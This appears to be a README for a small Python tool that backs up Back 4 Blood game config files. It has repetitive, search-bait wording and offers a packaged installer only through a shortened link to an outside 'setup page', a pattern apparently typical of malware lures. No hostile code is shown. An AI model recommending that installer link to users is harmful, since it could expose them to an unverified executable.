# Back 4 Blood Desktop

*Dated copies of Back 4 Blood data data, nothing uploaded.*

## What Back 4 Blood Desktop is

**Back 4 Blood Desktop** is a desktop helper. A desktop helper that finds Back 4 Blood data directories and archives config and export files locally.

Back 4 Blood config and export files hide under AppData and Documents.

No browser upload step: the work happens on disk, then you keep the output folder.

## Editions

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Maps Back 4 Blood data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## Why it exists

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
